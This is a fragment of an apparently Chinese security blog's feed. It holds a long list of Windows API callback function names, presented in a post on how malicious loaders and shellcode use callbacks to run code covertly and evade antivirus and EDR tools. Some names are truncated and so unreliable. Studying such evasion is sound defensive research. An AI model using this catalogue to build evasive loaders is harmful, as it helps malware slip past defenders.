class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br></pre></td><td class="code"><pre><span class="line">acmDriverEnumCallback</span><br><span class="line">acmDriverProc</span><br><span class="line">acmFilterChooseHookProc</span><br><span class="line">acmFilterEnumCallback</span><br><span class="line">acmFilterTagEnumCallback</span><br><span class="line">acmFormatChooseHookProc</span><br><span class="line">acmFormatEnumCallback</span><br><span class="line">acmFormatTagEnumCallback</span><br><span class="line">acmStreamConvertCallback</span><br><span class="line">AddInterface</span><br><span class="line">AddPropSheetPageProc</span><br><span class="line">AddSecureMemoryCacheCallback</span><br><span class="line">agePaintHook</span><br><span class="line">ageSetupHook</span><br><span class="line">AllocateMemory</span><br><span class="line">APCProc</span><br><span class="line">ApplicationRecoveryCallback</span><br><span class="line">ApplyCallbackFunction</span><br><span class="line">asswordChangeNotify</span><br><span class="line">asswordFilter</span><br><span class="line">AuthzAccessCheckCallback</span><br><span class="line">AuthzComputeGroupsCallback</span><br><span class="line">AuthzFreeGroupsCallback</span><br><span class="line">BindIoCompletionCallback</span><br><span class="line">BlockConvertServicesToStatic</span><br><span class="line">BlockDeleteStaticServices</span><br><span class="line">BrowseCallbackProc</span><br><span class="line">BufferCallback</span><br><span class="line">CallWndProc</span><br><span class="line">CallWndRetProc</span><br><span class="line">capControlCallback</span><br><span class="line">capErrorCallback</span><br><span class="line">capStatusCallback</span><br><span class="line">capVideoStreamCallback</span><br><span class="line">capWaveStreamCallback</span><br><span class="line">capYieldCallback</span><br><span class="line">CBTProc</span><br><span class="line">CCHookProc</span><br><span class="line">CertChainFindByIssuerCallback</span><br><span class="line">CertDllOpenStoreProv</span><br><span class="line">CertEnumPhysicalStoreCallback</span><br><span class="line">CertEnumSystemStoreCallback</span><br><span class="line">CertEnumSystemStoreLocationCallback</span><br><span class="line">CertStoreProvCloseCallback</span><br><span class="line">CertStoreProvDeleteCertCallback</span><br><span class="line">CertStoreProvDeleteCRLCallback</span><br><span class="line">CertStoreProvDeleteCTL</span><br><span class="line">CertStoreProvFindCert</span><br><span class="line">CertStoreProvFindCRL</span><br><span class="line">CertStoreProvFindCTL</span><br><span class="line">CertStoreProvFreeFindCert</span><br><span class="line">CertStoreProvFreeFindCRL</span><br><span class="line">CertStoreProvFreeFindCTL</span><br><span class="line">CertStoreProvGetCertProperty</span><br><span class="line">CertStoreProvGetCRLProperty</span><br><span class="line">CertStoreProvGetCTLProperty</span><br><span class="line">CertStoreProvReadCertCallback</span><br><span class="line">CertStoreProvReadCRLCallback</span><br><span class="line">CertStoreProvReadCTL</span><br><span class="line">CertStoreProvSetCertPropertyCallback</span><br><span class="line">CertStoreProvSetCRLPropertyCallback</span><br><span class="line">CertStoreProvSetCTLProperty</span><br><span class="line">CertStoreProvWriteCertCallback</span><br><span class="line">CertStoreProvWriteCRLCallback</span><br><span class="line">CertStoreProvWriteCTL</span><br><span class="line">CFHookProc</span><br><span class="line">ClaimMediaLabel</span><br><span class="line">CleanupGroupCancelCallback</span><br><span class="line">ClientCallback</span><br><span class="line">ClientCallback_Function</span><br><span class="line">CloseServiceEnumerationHandle</span><br><span class="line">CollectPerformanceData</span><br><span class="line">CompletionProc</span><br><span class="line">ConnectClient</span><br><span class="line">ControlCallback</span><br><span class="line">CopyProgressRoutine</span><br><span class="line">CounterPathCallBack</span><br><span class="line">CQPageProc</span><br><span class="line">CreateServiceEnumerationHandle</span><br><span class="line">CreateStaticService</span><br><span class="line">CryptGetSignerCertificateCallback</span><br><span class="line">CRYPT_ENUM_KEYID_PROP</span><br><span class="line">CRYPT_ENUM_OID_FUNCTION</span><br><span class="line">CRYPT_ENUM_OID_INFO</span><br><span class="line">CRYPT_RETURN_HWND</span><br><span class="line">CRYPT_VERIFY_IMAGE</span><br><span class="line">CspGetDHAgreement</span><br><span class="line">DavAuthCallback</span><br><span class="line">DavFreeCredCallback</span><br><span class="line">DavRegisterAuthCallback</span><br><span class="line">DavUnregisterAuthCallback</span><br><span class="line">DdeCallback</span><br><span class="line">DdeEnableCallback</span><br><span class="line">DeleteInterface</span><br><span class="line">DeleteStaticService</span><br><span class="line">DemandDialRequest</span><br><span class="line">DhcpAddressDelHook</span><br><span class="line">DhcpAddressOfferHook</span><br><span class="line">DhcpControlHook</span><br><span class="line">DhcpDeleteClientHook</span><br><span class="line">DhcpHandleOptionsHook</span><br><span class="line">DhcpNewPktHook</span><br><span class="line">DhcpPktDropHook</span><br><span class="line">DhcpPktSendHook</span><br><span class="line">DhcpServerCalloutEntry</span><br><span class="line">DialogProc</span><br><span class="line">DigestFunction</span><br><span class="line">DisassociateCurrentThreadFromCallback</span><br><span class="line">DisconnectClient</span><br><span class="line">DllCallbackProc</span><br><span class="line">DllGetClassObject</span><br><span class="line">DoUpdateRoutes</span><br><span class="line">DoUpdateServices</span><br><span class="line">DPA_DestroyCallback</span><br><span class="line">DPA_EnumCallback</span><br><span class="line">DrawStateProc</span><br><span class="line">DriverCallback</span><br><span class="line">DSA_DestroyCallback</span><br><span class="line">DSA_EnumCallback</span><br><span class="line">DSEnumAttributesCallback</span><br><span class="line">EditStreamCallback</span><br><span class="line">EditWordBreakProc</span><br><span class="line">EditWordBreakProcEx</span><br><span class="line">EmbeddedUIHandler</span><br><span class="line">EnableCallback</span><br><span class="line">EnhMetaFileProc</span><br><span class="line">EnumCalendarInfoProc</span><br><span class="line">EnumCalendarInfoProcEx</span><br><span class="line">EnumCalendarInfoProcExEx</span><br><span class="line">EnumChildProc</span><br><span class="line">EnumCodePagesProc</span><br><span class="line">EnumDateFormatsProc</span><br><span class="line">EnumDateFormatsProcEx</span><br><span class="line">EnumDateFormatsProcExEx</span><br><span class="line">EnumDesktopProc</span><br><span class="line">EnumDirTreeProc</span><br><span class="line">EnumerateGetNextService</span><br><span class="line">EnumerateLoadedModulesProc64</span><br><span class="line">EnumFontFamExProc</span><br><span class="line">EnumFontFamProc</span><br><span class="line">EnumFontsProc</span><br><span class="line">EnumGeoInfoProc</span><br><span class="line">EnumICMProfilesProcCallback</span><br><span class="line">EnumInputContext</span><br><span class="line">EnumLanguageGroupLocalesProc</span><br><span class="line">EnumLanguageGroupsProc</span><br><span class="line">EnumLocalesProc</span><br><span class="line">EnumLocalesProcEx</span><br><span class="line">EnumMetaFileProc</span><br><span class="line">EnumObjectsProc</span><br><span class="line">EnumPageFilesProc</span><br><span class="line">EnumRegisterWordProc</span><br><span class="line">EnumResLangProc</span><br><span class="line">EnumResNameProc</span><br><span class="line">EnumResTypeProc</span><br><span class="line">EnumThreadWndProc</span><br><span class="line">EnumTimeFormatsProc</span><br><span class="line">EnumTimeFormatsProcEx</span><br><span class="line">EnumUILanguagesProc</span><br><span class="line">EnumWindowsProc</span><br><span class="line">EnumWindowStationProc</span><br><span class="line">EventCallback</span><br><span class="line">EventClassCallback</span><br><span class="line">EventRecordCallback</span><br><span class="line">Event_Handler_Function_Name</span><br><span class="line">EVT_SUBSCRIBE_CALLBACK</span><br><span class="line">ExportCallback</span><br><span class="line">FaxLineCallback</span><br><span class="line">FaxRouteAddFile</span><br><span class="line">FaxRouteDeleteFile</span><br><span class="line">FaxRouteEnumFile</span><br><span class="line">FaxRouteEnumFiles</span><br><span class="line">FaxRouteGetFile</span><br><span class="line">FaxRouteModifyRoutingData</span><br><span class="line">FaxRoutingInstallationCallback</span><br><span class="line">FaxSendCallback</span><br><span class="line">FAX_RECIPIENT_CALLBACK</span><br><span class="line">FExecuteInAppDomainCallback</span><br><span class="line">FiberProc</span><br><span class="line">FileIOCompletionRoutine</span><br><span class="line">FILE_RESTORE_CALLBACK</span><br><span class="line">FindDebugInfoFileProc</span><br><span class="line">FindExecutableImageProc</span><br><span class="line">FLockClrVersionCallback</span><br><span class="line">FlsCallback</span><br><span class="line">FNCCERTDISPLAYPROC</span><br><span class="line">FNCFILTERPROC</span><br><span class="line">FNCMFILTERPROC</span><br><span class="line">FNCMHOOKPROC</span><br><span class="line">FNDAENUMCALLBACK</span><br><span class="line">FNDPAENUMCALLBACK</span><br><span class="line">FNDSAENUMCALLBACK</span><br><span class="line">FNPEER_FREE_SECURITY_DATA</span><br><span class="line">FNPEER_SECURE_RECORD</span><br><span class="line">FNPEER_VALIDATE_RECORD</span><br><span class="line">FN_AUTHENTICATION_CALLBACK</span><br><span class="line">FN_AUTHENTICATION_CALLBACK_EX</span><br><span class="line">FN_BLUETOOTH_ENUM_ATTRIBUTES_CALLBACK</span><br><span class="line">FN_CDF_PARSE_ERROR_CALLBACK</span><br><span class="line">FN_CERT_CHAIN_FIND_BY_ISSUER_CALLBACK</span><br><span class="line">FN_CERT_DLL_OPEN_STORE_PROV_FUNC</span><br><span class="line">FN_CERT_ENUM_PHYSICAL_STORE</span><br><span class="line">FN_CERT_ENUM_SYSTEM_STORE</span><br><span class="line">FN_CERT_STORE_PROV_CLOSE</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_DELETE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_READ_CERT</span><br><span class="line">FN_CERT_STORE_PROV_READ_CRL</span><br><span class="line">FN_CERT_STORE_PROV_SET_CERT_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CRL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_SET_CTL_PROPERTY</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CERT</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CRL</span><br><span class="line">FN_CERT_STORE_PROV_WRITE_CTL</span><br><span class="line">FN_CRYPT_XML_CREATE_TRANSFORM</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_CLOSE</span><br><span class="line">FN_CRYPT_XML_DATA_PROVIDER_READ</span><br><span class="line">FN_CRYPT_XML_ENUM_ALG_INFO</span><br><span class="line">FN_CRYPT_XML_WRITE_CALLBACK</span><br><span class="line">FN_DEVICE_CALLBACK</span><br><span class="line">FN_WdsCliCallback</span><br><span class="line">FN_WdsCliTraceFunction</span><br><span class="line">FN_WdsTransportClientReceiveContents</span><br><span class="line">FN_WdsTransportClientReceiveMetadata</span><br><span class="line">FN_WdsTransportClientSessionComplete</span><br><span class="line">FN_WdsTransportClientSessionStart</span><br><span class="line">FN_WdsTransportClientSessionStartEx</span><br><span class="line">ForegroundIdleProc</span><br><span class="line">FreeMemory</span><br><span class="line">FRHookProc</span><br><span class="line">FuncReturnhWnd</span><br><span class="line">FunctionTableAccessProc64</span><br><span class="line">FuncVerifyImage</span><br><span class="line">GenerateGroupPolicy</span><br><span class="line">GetApplicationRecoveryCallback</span><br><span class="line">GetEventMessage</span><br><span class="line">GetFirstOrderedService</span><br><span class="line">GetGlobalInfo</span><br><span class="line">GetInterfaceInfo</span><br><span class="line">GetMfeStatus</span><br><span class="line">GetModuleBaseProc64</span><br><span class="line">GetMsgProc</span><br><span class="line">GetNeighbors</span><br><span class="line">GetNextOrderedService</span><br><span class="line">GetRequest</span><br><span class="line">GetResponse</span><br><span class="line">GetServiceCount</span><br><span class="line">GetSize</span><br><span class="line">GetTSAudioEndpointEnumeratorForSession</span><br><span class="line">gluNurbsCallback</span><br><span class="line">gluQuadricCallback</span><br><span class="line">gluTessCallback</span><br><span class="line">GopherAttributeEnumerator</span><br><span class="line">HandlerEx</span><br><span class="line">HandlerRoutine</span><br><span class="line">honeCallbackFunc</span><br><span class="line">hone_Event</span><br><span class="line">HyphenateProc</span><br><span class="line">ICMProgressProcCallback</span><br><span class="line">ImportCallback</span><br><span class="line">InitHelperDll</span><br><span class="line">InitializeChangeNotify</span><br><span class="line">InitializeEmbeddedUI</span><br><span class="line">InitOnceCallback</span><br><span class="line">InsertAt</span><br><span class="line">InstalluiHandler</span><br><span class="line">InstalluiHandlerRecord</span><br><span class="line">INSTALLUI_HANDLER</span><br><span class="line">InterfaceStatus</span><br><span class="line">InternetSetStatusCallback</span><br><span class="line">InternetStatusCallback</span><br><span class="line">INTERNET_STATUS_CALLBACK</span><br><span class="line">IoCompletionCallback</span><br><span class="line">IOProc</span><br><span class="line">IsService</span><br><span class="line">JournalPlaybackProc</span><br><span class="line">JournalRecordProc</span><br><span class="line">KeyboardProc</span><br><span class="line">lineCallbackFunc</span><br><span class="line">LineDDAProc</span><br><span class="line">Line_Event</span><br><span class="line">LOG_FULL_HANDLER_CALLBACK</span><br><span class="line">LOG_TAIL_ADVANCE_CALLBACK</span><br><span class="line">LOG_UNPINNED_CALLBACK</span><br><span class="line">LowLevelKeyboardProc</span><br><span class="line">LowLevelMouseProc</span><br><span class="line">LPCQADDFORMSPROC</span><br><span class="line">LPCQADDPAGESPROC</span><br><span class="line">LPCQPAGEPROC</span><br><span class="line">LPDISPLAYVAL</span><br><span class="line">LPDSENUMATTRIBUTES</span><br><span class="line">LPEVALCOMCALLBACK</span><br><span class="line">LPFNDFMCALLBACK</span><br><span class="line">LPFNVIEWCALLBACK</span><br><span class="line">MagGetImageScalingCallback</span><br><span class="line">MagImageScalingCallback</span><br><span class="line">MagSetImageScalingCallback</span><br><span class="line">MappingCallbackProc</span><br><span class="line">MaxMediaLabel</span><br><span class="line">MessageProc</span><br><span class="line">MFAddPeriodicCallback</span><br><span class="line">MFInvokeCallback</span><br><span class="line">MFPERIODICCALLBACK</span><br><span class="line">MFRemovePeriodicCallback</span><br><span class="line">MgmCreationAlertCallback</span><br><span class="line">MgmDisableIgmpCallback</span><br><span class="line">MgmJoinAlertCallback</span><br><span class="line">MgmLocalJoinCallback</span><br><span class="line">MgmLocalLeaveCallback</span><br><span class="line">MgmPruneAlertCallback</span><br><span class="line">MgmRpfCallback</span><br><span class="line">MgmWrongIfCallback</span><br><span class="line">MGM_ENABLE_IGMP_CALLBACK</span><br><span class="line">MibCreate</span><br><span class="line">MibDelete</span><br><span class="line">MIBEntryCreate</span><br><span class="line">MIBEntryDelete</span><br><span class="line">MIBEntryGet</span><br><span class="line">MIBEntryGetFirst</span><br><span class="line">MIBEntryGetNext</span><br><span class="line">MIBEntrySet</span><br><span class="line">MibGet</span><br><span class="line">MibGetFirst</span><br><span class="line">MibGetNext</span><br><span class="line">MibGetTrapInfo</span><br><span class="line">MibSet</span><br><span class="line">MibSetTrapInfo</span><br><span class="line">MidiInProc</span><br><span class="line">MidiOutProc</span><br><span class="line">MiniDumpCallback</span><br><span class="line">MMCFreeNotifyHandle</span><br><span class="line">MMCPropertyChangeNotify</span><br><span class="line">MMCPropertyHelp</span><br><span class="line">MMCPropPageCallback</span><br><span class="line">MMIOProc</span><br><span class="line">MonitorEnumProc</span><br><span class="line">MouseProc</span><br><span class="line">MRUCMPPROC</span><br><span class="line">MyStatusProc</span><br><span class="line">OFNHookProc</span><br><span class="line">OFNHookProcOldStyle</span><br><span class="line">OpenPerformanceData</span><br><span class="line">ORASADFunc</span><br><span class="line">OutOfProcessExceptionEventCallback</span><br><span class="line">OutOfProcessExceptionEventDebuggerLaunchCallback</span><br><span class="line">OutOfProcessExceptionEventSignatureCallback</span><br><span class="line">OutputProc</span><br><span class="line">PIO_APC_ROUTINE</span><br><span class="line">QueryPower</span><br><span class="line">RadiusExtensionFreeAttributes</span><br><span class="line">RadiusExtensionInit</span><br><span class="line">RadiusExtensionProcess</span><br><span class="line">RadiusExtensionProcess2</span><br><span class="line">RadiusExtensionProcessEx</span><br><span class="line">RadiusExtensionTerm</span><br><span class="line">RASADFunc</span><br><span class="line">RasAdminAcceptNewConnection</span><br><span class="line">RasAdminConnectionHangupNotification</span><br><span class="line">RasAdminGetIpAddressForUser</span><br><span class="line">RasAdminReleaseIpAddress</span><br><span class="line">RasCustomDeleteEntryNotify</span><br><span class="line">RasCustomDial</span><br><span class="line">RasCustomDialDlg</span><br><span class="line">RasCustomEntryDlg</span><br><span class="line">RasCustomHangUp</span><br><span class="line">RasCustomScriptExecute</span><br><span class="line">RasDialFunc</span><br><span class="line">RasDialFunc1</span><br><span class="line">RasDialFunc2</span><br><span class="line">RasEapBegin</span><br><span class="line">RasEapEnd</span><br><span class="line">RasEapFreeMemory</span><br><span class="line">RasEapGetIdentity</span><br><span class="line">RasEapGetInfo</span><br><span class="line">RasEapInitialize</span><br><span class="line">RasEapInvokeConfigUI</span><br><span class="line">RasEapInvokeInteractiveUI</span><br><span class="line">RasEapMakeMessage</span><br><span class="line">RasFreeBuffer</span><br><span class="line">RasGetBuffer</span><br><span class="line">RasPBDlgFunc</span><br><span class="line">RasReceiveBuffer</span><br><span class="line">RasRetrieveBuffer</span><br><span class="line">RasSecurityDialogBegin</span><br><span class="line">RasSecurityDialogEnd</span><br><span class="line">RasSendBuffer</span><br><span class="line">RasSetCommSettings</span><br><span class="line">ReaderScroll</span><br><span class="line">ReadProcessMemoryProc64</span><br><span class="line">RegisterApplicationRecoveryCallback</span><br><span class="line">RegisterCallback</span><br><span class="line">RegisterProtocol</span><br><span class="line">RegisterWaitChainCOMCallback</span><br><span class="line">RemoveAt</span><br><span class="line">RemoveSecureMemoryCacheCallback</span><br><span class="line">RemoveTraceCallback</span><br><span class="line">rintHookProc</span><br><span class="line">RM_WRITE_STATUS_CALLBACK</span><br><span class="line">rocessGroupPolicy</span><br><span class="line">rocessGroupPolicyEx</span><br><span class="line">rogressNotificationCallback</span><br><span class="line">ropEnumProc</span><br><span class="line">ropEnumProcEx</span><br><span class="line">ropSheetPageProc</span><br><span class="line">ropSheetProc</span><br><span class="line">RpcAuthKeyRetrievalFn</span><br><span class="line">RpcMgmtAuthorizationFn</span><br><span class="line">RpcnotificationRoutine</span><br><span class="line">RpcObjectInqFn</span><br><span class="line">RPC_IF_CALLBACK_FN</span><br><span class="line">RtlInstallFunctionTableCallback</span><br><span class="line">RTM_ENTITY_EXPORT_METHOD</span><br><span class="line">RTM_EVENT_CALLBACK</span><br><span class="line">SampleCommand</span><br><span class="line">SampleCommit</span><br><span class="line">SampleConnect</span><br><span class="line">SampleDump</span><br><span class="line">SampleOsVersionCheck</span><br><span class="line">SampleStartHelper</span><br><span class="line">SampleStop</span><br><span class="line">SampleStopHelper</span><br><span class="line">SceSvcAttachmentAnalyze</span><br><span class="line">SceSvcAttachmentConfig</span><br><span class="line">SceSvcAttachmentUpdate</span><br><span class="line">SecureMemoryCacheCallback</span><br><span class="line">SendAsyncProc</span><br><span class="line">SendMessageCallback</span><br><span class="line">ServiceMain</span><br><span class="line">SetAt</span><br><span class="line">SetGlobalInfo</span><br><span class="line">SetInterfaceInfo</span><br><span class="line">SetInterfaceReceiveType</span><br><span class="line">SetLineRecoCallback</span><br><span class="line">SetPower</span><br><span class="line">SetProviderStatusFunc</span><br><span class="line">SetProviderStatusInfoFreeFunc</span><br><span class="line">SetResponseType</span><br><span class="line">SetTraceCallback</span><br><span class="line">SetupDefaultQueueCallback</span><br><span class="line">SetupHookProc</span><br><span class="line">SetupInitDefaultQueueCallback</span><br><span class="line">SetupTermDefaultQueueCallback</span><br><span class="line">ShellProc</span><br><span class="line">ShutdownEmbeddedUI</span><br><span class="line">SimpleCallback</span><br><span class="line">SNMPAPI_CALLBACK</span><br><span class="line">SnmpExtensionClose</span><br><span class="line">SnmpExtensionInit</span><br><span class="line">SnmpExtensionInitEx</span><br><span class="line">SnmpExtensionMonitor</span><br><span class="line">SnmpExtensionQuery</span><br><span class="line">SnmpExtensionQueryEx</span><br><span class="line">SnmpExtensionTrap</span><br><span class="line">SoundSentryProc</span><br><span class="line">SP_FILE_CALLBACK</span><br><span class="line">StackSnapshotCallback</span><br><span class="line">StartComplete</span><br><span class="line">StartProtocol</span><br><span class="line">StatusCallback</span><br><span class="line">StatusMessageCallback</span><br><span class="line">StatusRoutine</span><br><span class="line">StopProtocol</span><br><span class="line">SymEnumerateModulesProc64</span><br><span class="line">SymEnumerateSymbolsProc64</span><br><span class="line">SymEnumLinesProc</span><br><span class="line">SymEnumProcessesProc</span><br><span class="line">SymEnumSourceFilesProc</span><br><span class="line">SymEnumSourceFileTokensProc</span><br><span class="line">SymEnumSymbolsProc</span><br><span class="line">SymFindFileInPathProc</span><br><span class="line">SymRegisterCallback</span><br><span class="line">SymRegisterCallbackProc64</span><br><span class="line">SymRegisterFunctionEntryCallback</span><br><span class="line">SymRegisterFunctionEntryCallbackProc64</span><br><span class="line">SyncUpdateProc</span><br><span class="line">SysMsgProc</span><br><span class="line">TaskDialogCallbackProc</span><br><span class="line">ThreadProc</span><br><span class="line">TimeProc</span><br><span class="line">TimeProvClose</span><br><span class="line">TimeProvCommand</span><br><span class="line">TimeProvOpen</span><br><span class="line">TimerAPCProc</span><br><span class="line">TimerCallback</span><br><span class="line">TimerProc</span><br><span class="line">TranslateAddressProc64</span><br><span class="line">TranslateDispatch</span><br><span class="line">TrySubmitThreadpoolCallback</span><br><span class="line">UiaEventCallback</span><br><span class="line">UiaProviderCallback</span><br><span class="line">UiaRegisterProviderCallback</span><br><span class="line">UmsSchedulerProc</span><br><span class="line">UnbindInterface</span><br><span class="line">UndeleteFile</span><br><span class="line">UnregisterApplicationRecoveryCallback</span><br><span class="line">ValidateRoute</span><br><span class="line">VectoredHandler</span><br><span class="line">VERIFYSERVERCERT</span><br><span class="line">WaitCallback</span><br><span class="line">WaitChainCallback</span><br><span class="line">WaitOrTimerCallback</span><br><span class="line">waveInProc</span><br><span class="line">waveOutProc</span><br><span class="line">WdsTransportClientRegisterCallback</span><br><span class="line">WdsTransportProviderCloseContent</span><br><span class="line">WdsTransportProviderCloseInstance</span><br><span class="line">WdsTransportProviderCompareContent</span><br><span class="line">WdsTransportProviderCreateInstance</span><br><span class="line">WdsTransportProviderDumpState</span><br><span class="line">WdsTransportProviderGetContentMetadata</span><br><span class="line">WdsTransportProviderGetContentSize</span><br><span class="line">WdsTransportProviderInitialize</span><br><span class="line">WdsTransportProviderOpenContent</span><br><span class="line">WdsTransportProviderReadContent</span><br><span class="line">WdsTransportProviderRefreshSettings</span><br><span class="line">WdsTransportProviderShutdown</span><br><span class="line">WdsTransportProviderUserAccessCheck</span><br><span class="line">WdsTransportServerRegisterCallback</span><br><span class="line">WinBioCaptureSampleWithCallback</span><br><span class="line">WinBioEnrollCaptureWithCallback</span><br><span class="line">WinBioIdentifyWithCallback</span><br><span class="line">WinBioLocateSensorWithCallback</span><br><span class="line">WinBioVerifyWithCallback</span><br><span class="line">WindowProc</span><br><span class="line">WinEventProc</span><br><span class="line">WinHttpSetStatusCallback</span><br><span class="line">WINHTTP_STATUS_CALLBACK</span><br><span class="line">WLAN_NOTIFICATION_CALLBACK</span><br><span class="line">WorkCallback</span><br><span class="line">WPUQueryBlockingCallback</span><br><span class="line">xeProviderInitialize</span><br><span class="line">xeProviderRecvRequest</span><br><span class="line">xeProviderServiceControl</span><br><span class="line">xeProviderShutdown</span><br><span class="line">xeRegisterCallback</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;恶意的Loader和PIS（Position-Independent Shellcode）会使用各种技术来绕过AV/EDR和安全人员的分析，其中代码执行这个环节经常会通过“回调函数”的方式来隐蔽的执行。回调的本质是将函数A的地址传给函数B，在函数B执行的过程中，触发某个条件</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>一次简单的钓鱼分析之FTP执行LNK</title>
    <link href="http://example.com/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/"/>
    <id>http://example.com/2025/09/03/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E9%92%93%E9%B1%BC%E5%88%86%E6%9E%90%E4%B9%8BFTP%E6%89%A7%E8%A1%8CLNK/</id>
    <published>2025-09-03T13:37:39.000Z</published>
    <updated>2025-10-09T14:24:25.112Z</updated>
    
